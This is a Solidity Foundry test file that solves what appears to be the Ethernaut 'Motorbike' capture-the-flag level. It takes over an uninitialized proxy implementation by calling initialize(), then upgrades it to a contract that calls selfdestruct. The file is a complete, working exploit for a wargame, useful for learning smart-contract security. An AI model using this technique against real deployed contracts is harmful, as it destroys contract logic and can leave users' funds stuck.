// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IEngine {
  function initialize() external;
  function upgradeToAndCall(address, bytes memory) external;
}

contract SelfDestructableEngine {
  function attack() external {
    selfdestruct(payable(msg.sender));
  }
}

contract MotorBikeTest is Test {
  address internal challengeAddress;
  // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
  bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
  IEngine engine;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6);
    // get the address of the engine
    address engineAddress = address(uint160(uint256((vm.load(challengeAddress, _IMPLEMENTATION_SLOT)))));
    engine = IEngine(engineAddress);

    // create your evil engine
    SelfDestructableEngine evilEngine = new SelfDestructableEngine();

    // initialize to become the owner
    // upgrade to the evil engine, call the selfdestruct() attack
    engine.initialize();
    engine.upgradeToAndCall(address(evilEngine), abi.encodeWithSignature("attack()"));
  }

  function testExploit() public {
    // setUp() and testExploit() happen at different transactions,
    // we need to run our exploit at setUp() to be able to verify.
    utils.submitLevelInstance(challengeAddress);
  }
}
